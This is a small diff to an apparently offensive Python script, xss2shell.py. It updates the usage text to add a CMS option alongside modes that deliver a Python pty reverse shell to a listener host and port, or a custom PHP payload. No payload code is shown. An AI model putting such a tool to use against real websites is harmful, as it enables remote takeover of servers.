@@ -33,8 +33,8 @@ print """
 
 def help():
 	print('''Usage:
-  -> Default python pty reverse shell: ./xss2shell.py [lhost] [lport]
-  -> Custom php payload (no tags): ./xss2shell.py custom [payload.php]''')
+  -> Default python pty reverse shell: ./xss2shell.py [lhost] [lport] --[CMS]
+  -> Custom php payload (no tags): ./xss2shell.py custom [payload.php] --[CMS]''')
 
 def preparepayload(payload, theme):
 	if theme == 'null':
